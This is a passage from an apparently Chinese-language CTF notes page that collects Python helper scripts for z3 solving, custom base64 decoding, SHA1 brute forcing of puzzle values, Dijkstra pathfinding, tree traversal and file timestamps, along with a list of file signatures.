s.add(f2)</span><br></pre></td></tr></table></figure>

<p>例题1:<a target="_blank" rel="noopener" href="https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/moectf/Reverse/EquationPy.md">EquationPy</a>。例题2(z3的BitVec的使用,可使用异或位移等操作):<a target="_blank" rel="noopener" href="https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/moectf/Crypto/ezhash.md">ezhash</a></p>
<p>再给出一个求解flag的模板脚本。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = []</span><br><span class="line">s_length=<span class="number">25</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(s_length):</span><br><span class="line">    <span class="comment">#有的时候BitVec不行可以换Int，说不定能出来。前提是没有BitVec独有的操作</span></span><br><span class="line">    byte = BitVec(<span class="string">&quot;%s&quot;</span> % i, <span class="number">8</span>)</span><br><span class="line">    s.append(byte)</span><br><span class="line"></span><br><span class="line">z = Solver()</span><br><span class="line"></span><br><span class="line"><span class="comment">#这里写约束</span></span><br><span class="line"></span><br><span class="line">flag_format = <span class="string">&quot;flag&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag_format)):</span><br><span class="line">    z.add(s[i] == <span class="built_in">ord</span>(flag_format[i]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># check if all chars would be ascii printable</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag_format),s_length):</span><br><span class="line">     z.add(s[i] &gt;= <span class="built_in">ord</span>(<span class="string">&#x27;!&#x27;</span>))</span><br><span class="line">     z.add(s[i] &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;~&#x27;</span>))</span><br><span class="line">     </span><br><span class="line"><span class="comment"># chack if the last char would be &quot;&#125;&quot;</span></span><br><span class="line">z.add(s[-<span class="number">1</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;&#125;&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># check if z3 can solve it</span></span><br><span class="line"><span class="keyword">if</span> z.check() == sat:</span><br><span class="line">    solution = z.model()</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, s_length):</span><br><span class="line">        flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(solution[s[i]])))</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Check if z3 can&#x27;t solve it</span></span><br><span class="line"><span class="keyword">elif</span> z.check() == unsat:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Failed:&quot;</span> + <span class="built_in">str</span>(z.check()))</span><br></pre></td></tr></table></figure>

<ul>
<li><a target="_blank" rel="noopener" href="https://meashiri.github.io/ctf-writeups/posts/202307-cryptoctf/#blue-office">https://meashiri.github.io/ctf-writeups/posts/202307-cryptoctf/#blue-office</a> ：Extract函数使用. <code>Extract(high, low, expr)</code>:<ul>
<li>high is the index of the highest bit to extract.</li>
<li>low is the index of the lowest bit to extract.</li>
<li>expr is the expression from which the bits are to be extracted.</li>
</ul>
</li>
</ul>
<h2 id="python3实现换表base64解密"><a href="#python3实现换表base64解密" class="headerlink" title="python3实现换表base64解密"></a>python3实现换表base64解密</h2><p>此脚本为题目<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/challenges/details?hash=ebe1d9bb-662e-4922-a257-828d58e2a4aa_2&task_category_id=6">easyjni</a>的解题脚本。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line">data=<span class="built_in">list</span>(<span class="string">&#x27;MbT3sQgX039i3g==AQOoMQFPskB1Bsc7&#x27;</span>)</span><br><span class="line">index=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(data),<span class="number">2</span>):</span><br><span class="line">	data[i],data[i+<span class="number">1</span>]=data[i+<span class="number">1</span>],data[i]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span>.join(data[<span class="number">16</span>:]+data[:<span class="number">16</span>])</span><br><span class="line">STANDARD_ALPHABET = <span class="string">b&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">CUSTOM_ALPHABET = <span class="string">b&#x27;i5jLW7S0GX6uf1cv3ny4q8es2Q+bdkYgKOIT/tAxUrFlVPzhmow9BHCMDpEaJRZN&#x27;</span></span><br><span class="line">DECODE_TRANS = <span class="built_in">bytes</span>.maketrans(CUSTOM_ALPHABET, STANDARD_ALPHABET)</span><br><span class="line"><span class="built_in">print</span>(b64decode(flag.translate(DECODE_TRANS)))</span><br></pre></td></tr></table></figure>

<p>换表后题目给出的字符不全就要用itertools爆破，比如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">cipher=<span class="string">b&#x27;MyLkTaP3FaA7KOWjTmKkVjWjVzKjdeNvTnAjoH9iZOIvTeHbvD==&#x27;</span></span><br><span class="line">STANDARD_ALPHABET = <span class="string">b&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.permutations(<span class="string">b&quot;ju34&quot;</span>,<span class="number">4</span>):</span><br><span class="line">    s=<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(j) <span class="keyword">for</span> j <span class="keyword">in</span> i])</span><br><span class="line">    CUSTOM_ALPHABET = <span class="string">b&#x27;JASGBWcQPRXEFLbCDIlmnHUVKTYZdMovwipatNOefghq56rs&#x27;</span>+s.encode()+<span class="string">b&#x27;kxyz012789+/&#x27;</span></span><br><span class="line">    DECODE_TRANS = <span class="built_in">bytes</span>.maketrans(CUSTOM_ALPHABET, STANDARD_ALPHABET)</span><br><span class="line">    <span class="built_in">print</span>(b64decode(cipher.translate(DECODE_TRANS)))</span><br></pre></td></tr></table></figure>

<p>例题：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[WUSTCTF2020]B@se">[WUSTCTF2020]B@se</a></p>
<h2 id="python爆破sha1值"><a href="#python爆破sha1值" class="headerlink" title="python爆破sha1值"></a>python爆破sha1值</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42967398/article/details/96492843">来源</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;@DBApp&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>,<span class="number">999999</span>):</span><br><span class="line">	s = <span class="built_in">str</span>(i)+flag</span><br><span class="line">	x = hashlib.sha1(s.encode())</span><br><span class="line">	cnt = x.hexdigest()</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&quot;6e32d0943418c2c&quot;</span> <span class="keyword">in</span> cnt:</span><br><span class="line">		<span class="built_in">print</span>(cnt)</span><br><span class="line">		<span class="built_in">print</span>(<span class="built_in">str</span>(i)+flag)</span><br></pre></td></tr></table></figure>

<h2 id="常见文件文件头、文件尾"><a href="#常见文件文件头、文件尾" class="headerlink" title="常见文件文件头、文件尾"></a>常见文件文件头、文件尾</h2><p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/List_of_file_signatures">链接</a></p>
<p>补充：</p>
<ul>
<li>RAR文件尾：C4 3D 7B 00 40 07 00</li>
<li>jpg文件尾：FF D9</li>
<li>encrypto加密软件加密文件的文件头：4D 50 45 31(MPE1)，后缀.crypto</li>
<li><a target="_blank" rel="noopener" href="https://github.com/marcobellaccini/pyAesCrypt">pyAesCrypt</a>模块密文文件：41 45 53 02。提供一个解密脚本：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pyAesCrypt</span><br><span class="line">buffersize=<span class="number">0</span></span><br><span class="line">password=<span class="string">&#x27;&#x27;</span></span><br><span class="line">pyAesCrypt.decryptFile(<span class="string">&quot;cipher.enc&quot;</span>,<span class="string">&quot;plain&quot;</span>,password,buffersize)</span><br></pre></td></tr></table></figure>

<ul>
<li>png文件尾:AE 42 60 82</li>
<li>rec后缀文件，文件头<code>AMR#</code>,strings这类文件可得到<a target="_blank" rel="noopener" href="https://automacrorecorder.com/">Auto Mouse Recorder</a>。可以用官网下载软件播放该文件</li>
<li><a target="_blank" rel="noopener" href="https://github.com/M0R1AR7Y/Writeups/tree/main/MAPNA%202024/JigBoy">JigBoy</a><ul>
<li>JBIG（后缀<code>jbg</code>,<code>jbg2</code>）文件头：<code>97 4A 42 32 0D 0A 1A 0A</code></li>
<li>其他wp： <a target="_blank" rel="noopener" href="https://github.com/Jonnen98cool/CTF_writeups/blob/main/mapna_ctf_2024/JigBoy.md">https://github.com/Jonnen98cool/CTF_writeups/blob/main/mapna_ctf_2024/JigBoy.md</a></li>
</ul>
</li>
<li><a target="_blank" rel="noopener" href="https://github.com/Apzyte-Gamer/MapnaCTF-2024/tree/main/Forensics/XXG">XXG</a><ul>
<li>gimp xcf文件分析。注意xcf文件的版本过高也会导致文件无法打开。一般用的是v011</li>
<li>详细文件头格式参考 <a target="_blank" rel="noopener" href="https://developer.gimp.org/core/standards/xcf/#header">https://developer.gimp.org/core/standards/xcf/#header</a></li>
</ul>
</li>
<li>MFT文件头：<code>FILE0</code></li>
</ul>
<h2 id="C语言格式化字符串参考"><a href="#C语言格式化字符串参考" class="headerlink" title="C语言格式化字符串参考"></a>C语言格式化字符串参考</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/chenmozhe22/article/details/109738852">链接</a></p>
<h2 id="serpent分组加密算法"><a href="#serpent分组加密算法" class="headerlink" title="serpent分组加密算法"></a>serpent分组加密算法</h2><p>详情见大佬<a target="_blank" rel="noopener" href="https://blog.csdn.net/douqingl/article/details/50256931">博客</a>。可使用<a target="_blank" rel="noopener" href="https://www.tools4noobs.com/online_tools/decrypt/">在线网站</a>直接解密。</p>
<h2 id="exif查看"><a href="#exif查看" class="headerlink" title="exif查看"></a>exif查看</h2><p>misc或者osint题型中，可能会有信息藏在exif头中。使用<a target="_blank" rel="noopener" href="https://exif.tools/upload.php">在线工具</a>查看。</p>
<h2 id="dijkstra最短路径寻路算法"><a href="#dijkstra最短路径寻路算法" class="headerlink" title="dijkstra最短路径寻路算法"></a>dijkstra最短路径寻路算法</h2><p>例题：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%E6%95%91%E4%B8%96%E6%8D%B7%E5%BE%84">救世捷径</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#dijkstra算法</span></span><br><span class="line">graph=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>):</span><br><span class="line">    graph.append([])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>):</span><br><span class="line">        graph[i].append(<span class="number">0x3f3f3f</span>)</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;dj.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).readlines()<span class="comment">#这里需要手动将原文中的最后一行换行给去掉</span></span><br><span class="line">li=[]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> f:</span><br><span class="line">    li.append(x.strip().split(<span class="string">&#x27; &#x27;</span>))</span><br><span class="line"><span class="comment">#print(li)</span></span><br><span class="line"><span class="comment">#print(graph)</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> li:</span><br><span class="line">    graph[<span class="built_in">int</span>(x[<span class="number">0</span>])][<span class="built_in">int</span>(x[<span class="number">1</span>])]=<span class="built_in">int</span>(x[<span class="number">2</span>])</span><br><span class="line">    graph[<span class="built_in">int</span>(x[<span class="number">1</span>])][<span class="built_in">int</span>(x[<span class="number">0</span>])]=<span class="built_in">int</span>(x[<span class="number">2</span>])</span><br><span class="line"><span class="comment">#print(graph)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dijkstra</span>():</span><br><span class="line">    dv=[<span class="number">0x3f3f3f</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>)]<span class="comment">#点i到起点1的最短距离</span></span><br><span class="line">    route=[<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>)]<span class="comment">#记录每点和与它对应的上一点</span></span><br><span class="line">    vis=[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>)]<span class="comment">#各点到起点的最短距离是否已定.</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">27</span>):</span><br><span class="line">        dv[i]=graph[i][<span class="number">1</span>]</span><br><span class="line">    dv[<span class="number">1</span>]=<span class="number">0</span></span><br><span class="line">    <span class="comment">#print(dv)</span></span><br><span class="line">    vis[<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        minn=<span class="number">0x3f3f3f</span></span><br><span class="line">        temp=-<span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">27</span>):</span><br><span class="line">            <span class="keyword">if</span> vis[j]==<span class="number">0</span> <span class="keyword">and</span> minn&gt;dv[j]:</span><br><span class="line">                minn=dv[j]</span><br><span class="line">                temp=j</span><br><span class="line">        vis[temp]=<span class="number">1</span></span><br><span class="line">        <span class="comment">#print(temp)</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">27</span>):</span><br><span class="line">            <span class="keyword">if</span> dv[j]&gt;dv[temp]+graph[temp][j]:</span><br><span class="line">                dv[j]=dv[temp]+graph[temp][j]</span><br><span class="line">                route[j]=temp</span><br><span class="line">    <span class="keyword">return</span> (route,dv)</span><br><span class="line">route,dv=dijkstra()</span><br><span class="line"><span class="built_in">print</span>(dv[<span class="number">26</span>])</span><br><span class="line"><span class="built_in">print</span>(route)</span><br><span class="line">y=<span class="number">26</span></span><br><span class="line"><span class="keyword">while</span> y!=<span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(y)<span class="comment">#这里输出路径</span></span><br><span class="line">    y=route[y]</span><br></pre></td></tr></table></figure>

<h2 id="多重base编码解密脚本"><a href="#多重base编码解密脚本" class="headerlink" title="多重base编码解密脚本"></a>多重base编码解密脚本</h2><p>有时候会遇到base编码疯狂套娃，手动放工具里都要点击解密很多次，不如直接脚本自动化。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span> (<span class="string">r&#x27;flag_encode.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> f:</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">try</span> :</span><br><span class="line">                a=base64.b64decode(a).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                a=base64.b32decode(a).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                a=base64.b16decode(a).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> a:</span><br><span class="line">                <span class="built_in">print</span> (a)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="字频统计脚本"><a href="#字频统计脚本" class="headerlink" title="字频统计脚本"></a>字频统计脚本</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/109377328">来源</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">alphabet = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =\\&#123;\\&#125;[]&quot;</span></span><br><span class="line">strings = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">result = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> alphabet:</span><br><span class="line">	counts = strings.count(i)</span><br><span class="line">	i = <span class="string">&#x27;&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">	result[i] = counts</span><br><span class="line"></span><br><span class="line">res = <span class="built_in">sorted</span>(result.items(),key=<span class="keyword">lambda</span> item:item[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> res:</span><br><span class="line">	<span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">	flag = <span class="built_in">str</span>(i[<span class="number">0</span>])</span><br><span class="line">	<span class="built_in">print</span>(flag[<span class="number">0</span>],end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="二叉树遍历"><a href="#二叉树遍历" class="headerlink" title="二叉树遍历"></a>二叉树遍历</h2><h3 id="根据中序-后序遍历结果获取先序遍历结果"><a href="#根据中序-后序遍历结果获取先序遍历结果" class="headerlink" title="根据中序+后序遍历结果获取先序遍历结果"></a>根据中序+后序遍历结果获取先序遍历结果</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ToPreOrder</span>(<span class="params">Postorder,Inorder</span>):</span><br><span class="line">    length = <span class="built_in">len</span>(Postorder)</span><br><span class="line">    <span class="keyword">if</span> length == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    root = Postorder[length-<span class="number">1</span>] <span class="comment">#根节点　</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):<span class="comment">#找到中序遍历中根节点的位序</span></span><br><span class="line">        <span class="keyword">if</span> root == Inorder[i]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(root,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    ToPreOrder(Postorder[<span class="number">0</span>:i],Inorder[<span class="number">0</span>:i]) <span class="comment">#递归，传入左子树的后序和中序遍历序列</span></span><br><span class="line">    ToPreOrder(Postorder[i:length-<span class="number">1</span>],Inorder[i+<span class="number">1</span>:length])<span class="comment">#递归，传入右子树的后序和中序遍历序列</span></span><br></pre></td></tr></table></figure>

<h3 id="根据前序-中序遍历结果获取后序遍历结果"><a href="#根据前序-中序遍历结果获取后序遍历结果" class="headerlink" title="根据前序+中序遍历结果获取后序遍历结果"></a>根据前序+中序遍历结果获取后序遍历结果</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ao52426055/article/details/110420027">例题及来源</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_after_deep</span>(<span class="params">pre, mid, a</span>):<span class="comment">#已知前中，求后，a就是后序</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(pre) == <span class="number">1</span>:</span><br><span class="line">        a.append(pre[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(pre) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    root = pre[<span class="number">0</span>]</span><br><span class="line">    root_index = mid.index(root)</span><br><span class="line">    get_after_deep(pre[<span class="number">1</span>:root_index+<span class="number">1</span>], mid[:root_index], a)</span><br><span class="line">    get_after_deep(pre[root_index+<span class="number">1</span>:], mid[root_index+<span class="number">1</span>:], a)</span><br><span class="line">    a.append(root)</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hou</span>():</span><br><span class="line">    pre=<span class="built_in">input</span>(<span class="string">&quot;请依次输入前序遍历、中序遍历的结果，以换行分割:\n&quot;</span>)</span><br><span class="line">    mid=<span class="built_in">input</span>()</span><br><span class="line">    pre_list=<span class="built_in">list</span>(pre)</span><br><span class="line">    mid_list=<span class="built_in">list</span>(mid)</span><br><span class="line">    a=[]</span><br><span class="line">    res_list=get_after_deep(pre,mid,a)</span><br><span class="line">    res=<span class="string">&quot;&quot;</span>.join(res_list)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;后序遍历为:&quot;</span>,res)</span><br><span class="line">get_hou()</span><br></pre></td></tr></table></figure>

<p>例题:<a target="_blank" rel="noopener" href="https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Reverse/%5BWUSTCTF2020%5Dlevel4.md">[WUSTCTF2020]level4</a></p>
<h2 id="python时间戳相关-获取文件访问-创建-修改时间"><a href="#python时间戳相关-获取文件访问-创建-修改时间" class="headerlink" title="python时间戳相关+获取文件访问&#x2F;创建&#x2F;修改时间"></a>python时间戳相关+获取文件访问&#x2F;创建&#x2F;修改时间</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/shaosks/p/5614630.html">来源</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;把时间戳转化为时间: 1479264792 to 2016-11-16 10:53:12&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">TimeStampToTime</span>(<span class="params">timestamp</span>):</span><br><span class="line">	timeStruct = time.localtime(timestamp)</span><br><span class="line">	<span class="keyword">return</span> time.strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>,timeStruct)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">time_to_time_stamp</span>(<span class="params">str_time</span>):</span><br><span class="line">    dt = datetime.strptime(str_time, <span class="string">&#x27;%Y-%m-%d %H:%M&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> dt.timestamp()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;获取文件的大小,结果保留两位小数，单位为MB&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_FileSize</span>(<span class="params">filePath</span>):</span><br><span class="line">	fsize = os.path.getsize(filePath)</span><br><span class="line">	fsize = fsize/<span class="built_in">float</span>(<span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">round</span>(fsize,<span class="number">2</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;获取文件的访问时间&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_FileAccessTime</span>(<span class="params">filePath</span>):</span><br><span class="line">	t = os.path.getatime(filePath)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">f&quot;时间戳:<span class="subst">&#123;t&#125;</span>\n时间:<span class="subst">&#123;TimeStampToTime(t)&#125;</span>&quot;</span>)</span><br><span class="line"><span 